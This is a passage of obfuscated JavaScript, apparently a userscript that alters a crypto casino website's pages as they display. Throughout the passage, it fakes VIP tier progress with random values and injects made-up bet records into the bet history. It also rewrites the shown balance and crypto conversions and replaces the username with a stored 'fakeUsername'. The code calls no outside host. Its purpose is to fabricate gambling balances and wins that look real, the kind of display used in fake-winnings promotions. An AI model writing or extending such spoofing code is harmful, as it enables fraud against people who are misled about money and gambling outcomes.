              'min': 0xf4240,
              'max': 0x26259f,
              'text': "Platinum III",
              'color': "#6FDDE7"
            },
            'plativ': {
              'min': 0x2625a0,
              'max': 0x4c4b3f,
              'text': "Platinum IV",
              'color': "#6FDDE7"
            },
            'platv': {
              'min': 0x4c4b40,
              'max': 0x98967f,
              'text': "Platinum V",
              'color': "#6FDDE7"
            },
            'platvi': {
              'min': 0x989680,
              'max': 0x17d783f,
              'text': "Platinum VI",
              'color': "#6FDDE7"
            },
            'diamond': {
              'min': 0x17d7840,
              'max': 0x2faf07f,
              'text': 'Diamond',
              'color': "#00E4FB"
            },
            'diamond2': {
              'min': 0x2faf080,
              'max': 0x5f5e0ff,
              'text': "Diamond II",
              'color': "#00E4FB"
            },
            'diamond3': {
              'min': 0x5f5e100,
              'max': 0xee6b27f,
              'text': "Diamond III",
              'color': "#00E4FB"
            }
          };
          const _0x14726d = _0x518cb2 ? parseFloat(localStorage.getItem("previousStats").replace(/,/g, '')) : (Math.floor(Math.random() * (_0x3fb235[_0x324ef8].max - _0x3fb235[_0x324ef8].min + 0x1)) + _0x3fb235[_0x324ef8].min + Math.random()).toFixed(0x2);
          const _0x35584e = _0x518cb2 ? parseFloat(localStorage.getItem("previousStatsLeft")) : (0x64 - (_0x14726d - _0x3fb235[_0x324ef8].min) / (_0x3fb235[_0x324ef8].max - _0x3fb235[_0x324ef8].min) * 0x64).toFixed(0x2);
          if (!_0x518cb2) {
            localStorage.setItem("previousStats", _0x14726d);
            localStorage.setItem("previousStatsLeft", _0x35584e);
          }
          const _0x1dd602 = {
            'bronze': "silver",
            'silver': "gold",
            'gold': "plat1",
            'plat1': "plat2",
            'plat2': "plat3",
            'plat3': "plativ",
            'plativ': 'platv',
            'platv': "platvi",
            'platvi': "diamond",
            'diamond': 'diamond2',
            'diamond2': 'diamond3',
            'diamond3': "obsidian2"
          }[_0x324ef8];
          if ('1' === localStorage.getItem("autoLoadPreviousBalance")) {
            _0x4482fc(true);
          }
          const _0x3d3456 = localStorage.getItem(_0x324ef8);
          const _0x313d72 = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div > div > div.flex.justify-between.mb-6 > svg");
          const _0x6972d4 = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div > div > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(1) > span.svelte-1ew5yq8");
          const _0x2a6b08 = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div > div > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(2) > span.svelte-1ew5yq8");
          const _0x5dd48c = new DOMParser().parseFromString(_0x3d3456, "text/html").body.firstChild.firstChild;
          const _0x567854 = new DOMParser().parseFromString(_0x3d3456, 'text/html').body.firstChild.firstChild;
          const _0x57ac03 = new DOMParser().parseFromString(localStorage.getItem(_0x1dd602), "text/html").body.firstChild.firstChild;
          const _0x4378de = _0x5dd48c.firstChild.firstChild.firstChild;
          const _0xad888e = localStorage.getItem("vipProgress");
          const _0x53c88c = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div > div > div.w-full > div > div.flex.justify-between.items-center.gap-5 > span > span");
          _0x53c88c.innerText = _0xad888e ? _0xad888e + '%' : (0x64 - _0x35584e).toFixed(0x2) + '%';
          const _0x4fb896 = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div > div > div.w-full > div > div.relative.w-full.my-2.overflow-hidden.rounded-\\[10px\\].bg-grey-400.h-\\[0\\.625em\\] > div");
          for (_0x4fb896.style.right = _0xad888e ? 0x64 - parseFloat(_0xad888e) + '%' : _0x35584e + '%'; _0x313d72.firstChild;) {
            _0x313d72.removeChild(_0x313d72.firstChild);
          }
          for (_0x4378de && _0x313d72.appendChild(_0x4378de); _0x6972d4.firstChild;) {
            _0x6972d4.removeChild(_0x6972d4.firstChild);
          }
          for (; _0x567854.firstChild;) {
            _0x6972d4.appendChild(_0x567854.firstChild);
          }
          for (; _0x2a6b08.firstChild;) {
            _0x2a6b08.removeChild(_0x2a6b08.firstChild);
          }
          for (; _0x57ac03.firstChild;) {
            _0x2a6b08.appendChild(_0x57ac03.firstChild);
          }
          let _0x5170b2 = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div");
          if (_0x5170b2 && _0x5170b2.style.border) {
            let _0x3e5dd2 = _0x3fb235[_0x324ef8].color;
            _0x5170b2.style.border = _0x5170b2.style.border.replace(/#[0-9A-Fa-f]{6}|rgb[a]?\(.*?\)/, _0x3e5dd2);
          }
          let _0xe4e88 = document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div > div > div.w-full > div > div.relative.w-full.my-2.overflow-hidden.rounded-\\[10px\\].bg-grey-400.h-\\[0\\.625em\\] > div");
          if (_0xe4e88 && _0xe4e88.style.backgroundColor) {
            let _0x10d53a = _0x27463e(_0x3fb235[_0x324ef8].color);
            _0xe4e88.style.backgroundColor = _0xe4e88.style.backgroundColor.replace(/rgb\(.*?\)/, _0x10d53a);
          }
          document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div > div > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(1) > span.weight-semibold.line-height-120pct.align-left.size-default.text-size-default.variant-subtle.with-icon-space.svelte-17v69ua").textContent = _0x3fb235[_0x324ef8].text;
          document.querySelector("#main-content > div > div.header-wrapper.flex.justify-center.py-8.w-full.bg-cover > div > div > div.authenticated-wrapper.svelte-1l6r53q > div > div > div > div.w-full > div > div.flex.justify-between.w-full > div:nth-child(2) > span.weight-semibold.line-height-120pct.align-left.size-default.text-size-default.variant-subtle.with-icon-space.svelte-17v69ua").textContent = _0x3fb235[_0x1dd602].text;
          if ('1' === localStorage.getItem('toggleBlurVipProgress')) {
            _0x3b04bb();
          }
        } catch (_0x25db06) {
          console.error("An error occurred:", _0x25db06);
        }
        setTimeout(() => {
          _0x52a1fe = false;
        }, 0xc8);
      })(_0x3c8e02, true);
    }
    if (_0x732015 && !_0x34d364) {
      _0x34d364 = true;
      (function () {
        let _0x32d9c9;
        if ("ltc" === _0x48a9fe) {
          _0x32d9c9 = localStorage.getItem('ltc_menu');
          if (!_0x32d9c9) {
            return;
          }
        } else {
          if ('eth' === _0x48a9fe) {
            _0x32d9c9 = localStorage.getItem('eth_menu');
            if (!_0x32d9c9) {
              return;
            }
          } else {
            if ('pol' === _0x48a9fe) {
              _0x32d9c9 = localStorage.getItem("matic_menu");
              if (!_0x32d9c9) {
                return;
              }
            } else {
              if ("btc" === _0x48a9fe && (_0x32d9c9 = localStorage.getItem("btc_menu"), !_0x32d9c9)) {
                return;
              }
            }
          }
        }
        const _0x35bb39 = function (_0x2502f3) {
          const _0x4eaf4c = new DOMParser();
          return _0x4eaf4c.parseFromString(_0x2502f3, "application/xml").documentElement;
        }(_0x32d9c9);
        const _0x5a2df5 = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div > div > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-5afgzd");
        if (_0x5a2df5) {
          const _0xda861d = _0x5a2df5.lastElementChild;
          if (_0xda861d) {
            _0x5a2df5.replaceChild(_0x35bb39, _0xda861d);
            const _0x604008 = _0x264fba();
            const _0x14b753 = parseFloat(_0x604008.innerText.replace(/[^\d.]/g, ''));
            const _0x5f2e8c = {
              'usd': {
                'ltc': _0x58a80a,
                'eth': _0x120044,
                'pol': _0x15c063,
                'btc': _0xfd6c3e,
                'usdt': 0x1
              },
              'eur': {
                'ltc': _0x262b8b,
                'eth': _0x124372,
                'matic': _0x21c78d,
                'btc': _0x217262
              }
            };
            let _0x51dd39;
            let _0xba3cfd;
            if ("usd" === _0xbe34bd) {
              _0xba3cfd = _0x14b753;
              _0x51dd39 = _0x5f2e8c.usd[_0x48a9fe];
            } else if ("eur" === _0xbe34bd) {
              _0xba3cfd = _0x14b753 * _0x124a7d;
              _0x51dd39 = _0x5f2e8c.usd[_0x48a9fe];
            } else if ("inr" === _0xbe34bd) {
              _0xba3cfd = _0x14b753 / _0x368347;
              _0x51dd39 = _0x5f2e8c.usd[_0x48a9fe];
            }
            document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div > div > div > div > div.flex.flex-col.gap-4 > div.flex.flex-col.gap-1 > div.currency.svelte-didcjq > span.content.svelte-didcjq > span > span").innerText = _0x604008.innerText;
            document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div > div > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-5afgzd > div.currencies-item.svelte-5afgzd > div > div.value-ctainer.svelte-1la41np > span:nth-child(1) > span").innerText = (_0xba3cfd / _0x51dd39).toFixed(0x8);
            document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div > div > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-5afgzd > div.currencies-item.svelte-5afgzd > div > div.value-ctainer.svelte-1la41np > span:nth-child(2) > span > span:nth-child(1)").innerText = _0x604008.innerText;
            document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div > div > div > div > div.flex.flex-col.gap-4 > div.currencies.svelte-5afgzd > div.currencies-item.svelte-5afgzd > div > div.value-ctainer.svelte-1la41np > span:nth-child(2) > span > span:nth-child(2)").innerText = _0xbe34bd.toUpperCase();
          }
        }
        setTimeout(() => {
          _0x34d364 = false;
        }, 0xc8);
      })();
    }
    if (_0x1b3b2a && !_0x564cde) {
      _0x564cde = true;
      (function () {
        const _0x326590 = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(1) > div.title-wrap.svelte-1am3p27 > h2").innerText;
        const _0x41f10b = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(1) > div.stack.x-center.y-center.gap-smaller.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > span").innerText.split('at')[0x1].trim();
        let _0x43c853 = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(2) > div.stack.x-stretch.y-center.gap-smaller.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-smaller.padding-right-auto.svelte-1cd1boi > dl > div:nth-child(2) > dd > span").innerText.replace('×', '').trim();
        let _0x55db9c = parseFloat(_0x43c853).toFixed(0x2);
        const _0x3005b5 = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(2) > div.stack.x-stretch.y-center.gap-smaller.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-smaller.padding-right-auto.svelte-1cd1boi > dl > div:nth-child(1) > dd > div > span.content.svelte-didcjq > span > span").innerText;
        _0x276961.forEach(_0x2d706d => {
          _0x3005b5.trim();
          const _0x50c8db = _0x55db9c + '×';
          if (_0x2d706d.game === _0x326590 && _0x2d706d.multiplier === _0x50c8db && _0x2d706d.time === _0x41f10b) {
            const _0x3d948e = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(2) > div.stack.x-stretch.y-center.gap-smaller.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-smaller.padding-right-auto.svelte-1cd1boi > dl > div:nth-child(1) > dd > div > span.content.svelte-didcjq > span > span");
            const _0x34a5fe = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(2) > div.stack.x-stretch.y-center.gap-smaller.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-smaller.padding-right-auto.svelte-1cd1boi > dl > div:nth-child(3) > dd > div > span.content.svelte-didcjq > span > span");
            if (_0x3d948e && _0x34a5fe) {
              _0x3d948e.innerText = _0x2d706d.bet_amount;
              _0x34a5fe.innerText = _0x2d706d.payout;
            }
            if ('1' === localStorage.getItem("toggleBlurVipProgress")) {
              if ("fakeUser" === localStorage.getItem("blurEffect")) {
                _0x30b4e3(0x8, 0x32);
              } else {
                _0x434888(0x8, 0x32);
              }
            }
          }
        });
      })();
      const _0x34f5a6 = new MutationObserver(() => {
        if (!document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(1) > div.title-wrap.svelte-1am3p27 > h2")) {
          setTimeout(() => {
            _0x564cde = false;
          }, 0xc8);
          _0x34f5a6.disconnect();
        }
      });
      _0x34f5a6.observe(document.body, {
        'childList': true,
        'subtree': true
      });
    }
    if (_0x2972fc && !_0x13536b) {
      _0x13536b = true;
      (function (_0x4c83b5) {
        const _0xb19a21 = document.querySelector(".tooltip-content span");
        if (_0xb19a21) {
          const _0xe11ee1 = _0x264fba();
          const _0x3260de = parseFloat(_0xe11ee1.innerText.replace(/[^\d.]/g, ''));
          const _0x8e93d3 = {
            'usd': {
              'ltc': _0x58a80a,
              'eth': _0x120044,
              'pol': _0x15c063,
              'btc': _0xfd6c3e,
              'usdt': 0x1
            },
            'eur': {
              'ltc': _0x262b8b,
              'eth': _0x124372,
              'matic': _0x21c78d,
              'btc': _0x217262
            }
          };
          let _0x3b9b46;
          let _0x48bf86;
          if ("usd" === _0xbe34bd) {
            _0x48bf86 = _0x3260de;
            _0x3b9b46 = _0x8e93d3.usd[_0x48a9fe];
          } else if ("eur" === _0xbe34bd) {
            _0x48bf86 = _0x3260de * _0x124a7d;
            _0x3b9b46 = _0x8e93d3.usd[_0x48a9fe];
          } else if ("inr" === _0xbe34bd) {
            _0x48bf86 = _0x3260de / _0x368347;
            _0x3b9b46 = _0x8e93d3.usd[_0x48a9fe];
          }
          const _0x2adeb4 = _0x48bf86 / _0x3b9b46;
          _0xb19a21.textContent = _0x2adeb4.toFixed(0x8);
        }
      })();
      setTimeout(() => {
        _0x13536b = false;
      }, 0x64);
    }
    if (_0x5995b4 && 'Vault' === _0x5995b4.innerText) {
      const _0x5acef4 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > button:nth-child(1)");
      const _0x257538 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > button:nth-child(2)");
      if (_0xc19aae(_0x5acef4) && !_0x513575) {
        _0x27bbd8();
        _0x513575 = true;
        _0x6f6962 = false;
        _0xb330ee = true;
      } else if (_0xc19aae(_0x257538) && !_0x6f6962) {
        _0xb330ee = false;
        _0x2681cf();
        _0x513575 = false;
        _0x6f6962 = true;
      }
    } else if (!_0x5995b4) {
      setTimeout(() => {
        _0x513575 = false;
        _0x6f6962 = false;
        _0xb330ee = true;
      }, 0xc8);
    }
  }).observe(document.body, {
    'childList': true,
    'subtree': true
  });
  function _0x53cb46() {
    _0x20235c("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div > div", _0xb92d45);
    _0xd97eb3 = setTimeout(() => {
      _0x53cb46();
    }, 0x7d0);
  }
  function _0x3e97b0() {
    let _0x13f85c = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(1)");
    if ("blackjack" === _0x51e761) {
      _0x13f85c = document.querySelector("#main-content > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(2)");
    }
    if (_0x13f85c) {
      _0x385f95 = new MutationObserver(_0x17f939 => {
        for (let _0x5721c1 of _0x17f939) if ("disabled" === _0x5721c1.attributeName) {
          if ("blackjack" === _0x51e761) {
            document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1nbx5re > input").disabled = _0x13f85c.disabled;
          } else {
            document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1nbx5re > input").disabled = _0x13f85c.disabled;
          }
        }
      });
      _0x385f95.observe(_0x13f85c, {
        'attributes': true
      });
    }
  }
  function _0x52a358() {
    if (_0x385f95) {
      _0x385f95.disconnect();
    }
  }
  function _0x30b4e3(_0x3d55c1 = 0x5, _0x3d6cc0 = 0x64) {
    if (_0x3d55c1 <= 0x0) {
      return;
    }
    const _0x108a84 = localStorage.getItem("selectedTier") || "bronze";
    const _0x46c14f = localStorage.getItem(_0x108a84);
    if (_0x46c14f) {
      const _0x115580 = new DOMParser().parseFromString(_0x46c14f, "text/html").body.firstChild.firstChild;
      const _0x3f20f1 = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(1) > div.stack.x-center.y-center.gap-smaller.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div > div > span > div > span > svg");
      if (_0x3f20f1 && _0x115580) {
        const _0x4432d3 = _0x115580.firstChild.firstChild.firstChild;
        for (; _0x3f20f1.firstChild;) {
          _0x3f20f1.removeChild(_0x3f20f1.firstChild);
        }
        if (_0x4432d3) {
          _0x3f20f1.appendChild(_0x4432d3);
        }
        const _0xc672a6 = document.querySelector("#svelte > div.fixed.left-0.top-0.bottom-0.right-0.p-4.flex.items-center.justify-center.text-\\[length\\:var\\(--text-size-default\\)\\].z-\\[--z-index\\] > div.rounded-md.bg-cover.bg-center.relative.w-full.min-w-\\[200px\\].max-w-\\[500px\\].max-h-\\[calc\\(100\\%-4em\\)\\].flex.flex-col.bg-grey-600.text-grey-200.overflow-hidden > div.scrollY.overscroll-contain > div > div:nth-child(1) > div.stack.x-center.y-center.gap-smaller.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div > div > button");
        if (_0xc672a6) {
          _0xc672a6.innerText = localStorage.getItem("fakeUsername") || "Anonymous";
        }
      } else {
        setTimeout(() => _0x30b4e3(_0x3d55c1 - 0x1, _0x3d6cc0), _0x3d6cc0);
      }
    }
  }
  function _0x434888(_0x4b465a = 0x5, _0x4fb6ae = 0x64) {
    if (_0x4b465a <= 0x0) {
      return;
    }
    const _0xd87aae = document.querySelector("#modal-scroll > div > div:nth-child(1) > div.stack.x-center.y-center.gap-smaller.padding-none.direction-vertical.padding-left-auto.padding-top-auto.padding-bottom-auto.padding-right-auto.svelte-1cd1boi > div > div > div");
    if (_0xd87aae) {
      _0xd87aae.style.filter = 'blur(10px)';
    } else {
      setTimeout(() => _0x434888(_0x4b465a - 0x1, _0x4fb6ae), _0x4fb6ae);
    }
  }
  function _0x38e247() {
    if (!_0x1ca05d) {
      if (_0x1a69db) {
        const _0x1fcef7 = new Date();
        let _0x46cd36 = _0x1fcef7.getHours();
        const _0x5a75d2 = _0x1fcef7.getMinutes();
        const _0x57ce86 = _0x46cd36 >= 0xc ? 'PM' : 'AM';
        _0x46cd36 %= 0xc;
        _0x46cd36 = _0x46cd36 || 0xc;
        const _0x5ab07d = _0x46cd36 + ':' + (_0x5a75d2 < 0xa ? '0' : '') + _0x5a75d2 + " " + _0x57ce86;
        const _0x4d799c = _0x369ea9[_0xbe34bd] + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        _0x276961.push({
          'game': "Keno",
          'bet_amount': _0x4d799c,
          'payout': '-' + _0x4d799c,
          'multiplier': "0.00×",
          'time': _0x5ab07d
        });
      }
      const _0x5d274c = _0x264fba();
      const _0x1d62f5 = parseFloat(_0x5d274c.innerText.replace(/[^\d.]/g, '')) - _0x2fe346;
      const _0x54e97b = _0x369ea9[_0xbe34bd] + _0x1d62f5.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
      _0x5d274c.innerText = _0x54e97b;
      _0x1ca05d = true;
      _0x1a69db = true;
      _0xd8bd68 = false;
      _0x2c3e56 = setTimeout(() => {
        _0x1ca05d = false;
      }, 0x64);
    }
  }
  function _0x26f9a9() {
    if (!_0x510b88 && _0x1a8633) {
      if (_0x18ffb0) {
        const _0x2d8b78 = new Date();
        let _0x671a85 = _0x2d8b78.getHours();
        const _0x399f7a = _0x2d8b78.getMinutes();
        const _0x1eeed5 = _0x671a85 >= 0xc ? 'PM' : 'AM';
        _0x671a85 %= 0xc;
        _0x671a85 = _0x671a85 || 0xc;
        const _0x2e7b99 = _0x671a85 + ':' + (_0x399f7a < 0xa ? '0' : '') + _0x399f7a + " " + _0x1eeed5;
        const _0x55dd9e = _0x369ea9[_0xbe34bd] + _0x2fe346.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
        _0x276961.push({
          'game': "Mines",
          'bet_amount': _0x55dd9e,
          'payout': '-' + _0x55dd9e,
          'multiplier': '0.00×',
          'time': _0x2e7b99
        });
      }
      const _0x20b1a9 = _0x264fba();
      const _0x3a7088 = parseFloat(_0x20b1a9.innerText.replace(/[^\d.]/g, '')) - _0x2fe346;
      const _0x8a51ba = _0x369ea9[_0xbe34bd] + _0x3a7088.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',');
      if (_0x37284d) {
        _0x20b1a9.innerText = _0x8a51ba;
        _0x334490 = false;
        _0x18ffb0 = true;
        _0x510b88 = true;
        _0x3493c8 = false;
      }
    }
  }
  function _0x58d117() {
    if (_0x37284d) {
      _0x116709("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button", _0x26f9a9);
    }
    _0x883401 = setTimeout(() => {
      _0x58d117();
    }, 0xfa);
  }
  function _0xdf815() {
    const _0x4e844e = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > span");
    const _0x1bc0e2 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.labels.svelte-5v1hdl > span > div > div > div > div");
    if (_0x4e844e) {
      _0x1a8633 = true;
      const _0x234c74 = {
        'usd': {
          'ltc': _0x58a80a,
          'eth': _0x120044,
          'pol': _0x15c063,
          'btc': _0xfd6c3e,
          'usdt': 0x1
        },
        'eur': {
          'ltc': _0x262b8b,
          'eth': _0x124372,
          'matic': _0x21c78d,
          'btc': _0x217262
        }
      };
      let _0x3bf849;
      let _0x21f5d3;
      if ("usd" === _0xbe34bd) {
        _0x21f5d3 = _0x2fe346;
        _0x3bf849 = _0x234c74.usd[_0x48a9fe];
      } else if ("eur" === _0xbe34bd) {
        _0x21f5d3 = _0x2fe346 * _0x124a7d;
        _0x3bf849 = _0x234c74.usd[_0x48a9fe];
      } else if ("inr" === _0xbe34bd) {
        _0x21f5d3 = _0x2fe346 / _0x368347;
        _0x3bf849 = _0x234c74.usd[_0x48a9fe];
      }
      const _0x1b626f = _0xbf0157(_0x4e844e.innerText);
      const _0x4a84db = _0x21f5d3 * _0x1b626f - _0x21f5d3;
      document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl > label > div.input-wrap.svelte-1nbx5re > div > input").value = (_0x2fe346 * _0x1b626f - _0x2fe346).toFixed(0x2);
      const _0x97b0ad = (_0x4a84db / _0x3bf849).toFixed(0x8);
      _0x1bc0e2.innerText = _0x97b0ad + " " + _0x48a9fe.toUpperCase();
    } else {
      _0x1a8633 = false;
    }
    _0x2743c7 = setTimeout(_0xdf815, 0xa);
  }
  function _0x2d6211() {
    let _0x5a3d70 = true;
    new MutationObserver((_0x1c37ba, _0x592df3) => {
      if (!_0x5a3d70) {
        return;
      }
      if (document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form")) {
        _0x5a3d70 = false;
        _0x592df3.disconnect();
        let _0x308ca7 = 0x0;
        let _0x6bf9f7 = 0x0;
        let _0x4c0a89 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > label:nth-child(2) > div > div.input-content.svelte-1nbx5re > input");
        const _0x1cc913 = document.querySelector("#modal-scroll > div > div.content.svelte-1m9kzo7 > div > div > div > div > form > label:nth-child(2) > span > div.currency-conversion.svelte-e4myuj > div > div");
